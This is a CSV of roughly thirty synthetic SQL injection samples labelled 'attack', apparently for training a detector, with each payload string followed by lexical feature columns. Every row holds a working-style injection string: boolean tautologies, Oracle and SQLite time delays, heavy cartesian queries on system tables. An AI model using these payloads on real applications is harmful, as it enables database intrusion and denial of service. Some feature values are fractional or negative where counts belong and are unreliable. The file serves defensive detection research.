id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000280,attack,boolean,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000878,0.010154720084078977,72.06707392785103,24.009581989693004,3.6580243267704016,13.0,24.0,26.05749193815801,9.009581989693,0.18040225719724626,0.3330503209795316,0.3615322604471256,0.12501516137609653,0.0,0.0,3.0,0.0,1.0,2.0,0.0,3.009581989693002,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R001221,0.30318722382822694,99.10018476703311,27.759926093186756,3.424017291099192,20.000000000000004,16.0,46.48014781362649,16.620036953406622,0.20215387930141854,0.16172310344113483,0.4684676379456736,0.16765537931177305,4.0,0.0,1.0,0.0,0.0,2.0,0.0,7.620036953406623,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000342,0.36236145165625505,67.83292462308029,18.28329246230803,2.973935293022994,14.0,9.0,34.26633969846423,10.566584924616055,0.20724903697987201,0.13323152377277486,0.5039299471716114,0.15558949207574171,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.566584924616057,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",nearest_attack_euclidean,R001557,0.19108203086070757,147.0,28.925913231080134,3.228113043539815,42.0,13.0,74.0,18.0,0.2857142857142857,0.08843537414965986,0.5034013605442177,0.12244897959183673,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000284,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001130,0.48776147752971666,139.7533426784704,30.8766713392352,3.976409217457901,68.69836370502881,10.0,40.931650312676794,20.1233286607648,0.4910141662865044,0.0715690229238261,0.2932956044752347,0.14412120631443476,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.123328660764797,0.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000285,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000794,0.34124051302625635,112.14736255335436,33.0,3.588832164217294,31.0,15.0,49.622802127795296,16.52456042555906,0.27703096334706756,0.1340472403292262,0.4416175088157056,0.14730428750800065,2.0,0.0,2.0,1.0,0.0,1.0,0.0,9.52456042555906,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000286,attack,boolean,"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001003,1.0213757236467835,151.57984659822347,32.84030680355303,3.29684394094147,34.57984659822348,15.0,76.0,26.0,0.22812138602266244,0.09895879666376123,0.5013912364297235,0.1715285808838528,2.0,4.0,0.0,1.0,0.0,2.0,0.0,14.0,2.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.5798465982234866,0.4201534017765135,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,boolean,"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000411,1.2621726852039403,159.93522938776138,38.4676146938807,4.0575329170924395,51.4676146938807,23.532385306119306,57.0,27.93522938776139,0.3217959309953982,0.1471621453325011,0.3564081380092035,0.1746337856628971,1.9352293877613906,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.4676146938806952,0.5323853061193048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000288,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000300,0.1279176299464436,123.93725846262623,27.0,3.6409849646576937,37.0,16.0,49.14980677010099,21.787451692525245,0.298621429125522,0.12913359097319868,0.39645752820875413,0.17578745169252524,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.787451692525245,0.0,2.0,1.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000289,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000432,0.6769365992430462,140.48552730615916,34.95059835622523,4.285528078944198,65.26746447496697,15.0,40.90119671245045,19.316866118741743,0.46471537213830577,0.1069104897616696,0.29081319711311426,0.13756094098691038,4.0,4.0,0.0,0.0,0.0,1.6831338812582584,0.0,4.633732237483483,0.0,0.0,0.0,5.683133881258259,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000290,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000348,0.19950544290997962,127.19635028004359,30.1993917133406,3.8071092399133906,39.6012165733188,16.0,48.29604613671388,23.299087570010897,0.3118184539358423,0.12588327556471718,0.3791737606431965,0.18312450985624398,0.0,0.0,2.0,0.0,0.0,1.0,0.0,10.299087570010897,0.0,2.0,1.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000291,attack,boolean,"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001060,0.4009833969062579,147.45279288123447,35.838891212497614,3.9655713860505206,43.51667363749283,24.0,54.51667363749283,25.419445606248807,0.2948115923849781,0.163068285817827,0.36955122338481555,0.17256889841237932,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.419445606248805,0.0,2.0,1.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,boolean,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",nearest_attack_euclidean,R000852,0.21399409761312355,73.6814268549031,26.681426854903098,3.8202724698860955,20.54514148392248,16.0,26.0,11.13628537098062,0.27856810523854564,0.2172632894839393,0.35305284541140136,0.15111575986611364,4.0,0.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.13628537098061944,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",nearest_attack_euclidean,R001165,0.2950894256816191,107.3363035375051,27.476614791072155,4.058725666732212,68.3363035375051,3.0000000000000018,23.0,13.0,0.6362712957348146,0.027979131097321974,0.21450667174613502,0.1212429014217285,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000033,0.3555487196525115,65.0,21.319324706722984,3.47179228745828,26.0,5.680675293277018,24.0,9.319324706722984,0.4,0.08739500451195412,0.36923076923076925,0.14337422625727667,0.0,2.0,2.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.31932470672298296,6.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000295,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000585,0.14551243706810543,125.74929401455164,31.895774501212635,3.6889261846461774,46.0,10.0,51.95774501212637,17.791549002425274,0.3661439558596799,0.07959651214340867,0.4127984275089909,0.1414611044879206,2.0,3.0,0.0,1.0,0.0,1.0,0.0,9.791549002425272,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh",nearest_attack_euclidean,R000910,1.6219592289841498,119.0,29.414069769590654,4.025815091356696,53.0,14.0,37.0,15.0,0.44537815126050423,0.11764705882352941,0.31092436974789917,0.12605042016806722,1.24220930877196,1.75779069122804,0.0,0.0,0.0,0.0,0.0,8.0,0.0,1.0,3.0,0.0,0.41406976959065334,0.5859302304093468,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,boolean,"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001079,0.05241701786666139,156.0,32.25117625725145,4.1114695708712805,75.0,16.0,49.0,16.0,0.4807692307692308,0.10256410256410256,0.3141025641025641,0.10256410256410256,0.0,0.0,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000298,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,0.5911073911533414,140.85581885254533,32.51441811474547,3.564435449158964,46.0,13.0,62.88465508203626,18.971163770509065,0.32698591522879306,0.09240906299944152,0.44600220481752406,0.1346028169542414,0.0,4.0,0.0,0.0,1.0,1.0,0.0,10.971163770509067,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000299,attack,boolean,"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001491,0.7043073978711565,100.0439848786102,28.380498109826274,3.5880776661506233,31.0,13.0,41.28298865895765,14.76099621965255,0.31032267734541813,0.13013531630614308,0.4121486980513593,0.14739330829707947,0.0,1.0,2.0,0.0,1.0,1.0,0.0,7.380498109826275,0.3804981098262752,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000300,attack,boolean,"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000358,0.4091676062436424,153.4447255799374,35.01579269144646,4.208127377790504,75.0,16.0,45.95262192566064,16.49210365427677,0.4890295363696261,0.10432630109218691,0.2991834432658933,0.10746071927229373,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.4921036542767725,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000301,attack,boolean,"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001270,0.09664485066580565,130.38699621856125,37.0,3.8656751638687292,37.04024716392094,23.0,52.34674905464031,18.0,0.2838374933671474,0.17648950868404295,0.4015507737612978,0.13812222418751188,2.0,1.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000302,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R001135,0.009729551985073085,120.89546062432865,27.01493419652448,3.917225952045492,70.89546062432865,8.0,31.0,11.0,0.5863979288978131,0.06617633137634993,0.2564332840833559,0.09099245564248115,0.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,boolean,-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,nearest_attack_euclidean,R000404,0.1509899219945322,76.86904018336644,21.0,3.06199491996646,13.0,12.0,39.09523214669315,12.773808036673287,0.16943862700155285,0.15640488646297188,0.5080442119357858,0.1661122745996894,4.0,0.0,1.0,0.0,0.0,2.0,0.0,5.7738080366732865,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000323,1.7106991777163432,149.8442207750471,34.0,3.990581265464516,63.0,10.0,52.70351731253925,24.14070346250785,0.421105982006408,0.06684221936609651,0.3509553169080035,0.16109648171949195,1.7110551937617737,1.2889448062382263,0.0,0.0,0.0,0.0,0.0,11.14070346250785,0.0,2.0,1.0,6.0,0.5703517312539246,0.4296482687460754,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000305,attack,boolean,"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000862,0.3213767465679527,65.05209460235412,22.820837840941653,3.7018290875427824,10.820837840941657,24.0,20.82083784094165,9.410418920470825,0.1655124674833187,0.37024347239475985,0.3197805809811353,0.144463479140786,1.0,0.0,3.0,0.0,0.0,2.0,0.0,2.2052094602354133,0.0,0.2052094602354133,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,boolean,"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001072,0.9650144348015613,135.769121539224,32.557719615194,3.63180923273491,36.0,16.0,57.769121539224,26.0,0.2652126121884023,0.11787227208373437,0.4253726735917949,0.19154244213606836,0.5577196151939996,0.0,2.0,0.0,0.0,1.0,0.0,12.442280384806,0.0,2.0,1.0,9.0,0.5577196151939996,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000307,attack,boolean,"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001315,0.08066147719518174,129.7144728166175,32.828683689970504,4.28441214379225,71.0,8.9428945633235,32.885789126647,16.885789126647,0.5474013803089327,0.06893206386969215,0.2535123066778912,0.13015424914348386,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,1.0,0.0,2.9428945633235006,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000308,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",nearest_attack_euclidean,R000390,0.41752803839232916,122.56089912333917,27.508699874762737,4.019349278325471,71.0,5.0,29.052199248576425,17.508699874762737,0.5797769882781726,0.0408293653717023,0.23653650349298228,0.14285714285714285,3.0,0.0,0.0,0.0,1.0,1.0,0.0,3.5086998747627374,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000309,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.15972531686402927,65.71011327609992,24.284045310439964,3.6490442993557437,11.568090620879929,21.0,24.0,9.142022655219982,0.1756295921582629,0.31979947718723123,0.3654851167854071,0.13908581386909882,1.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,0.14202265521998148,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
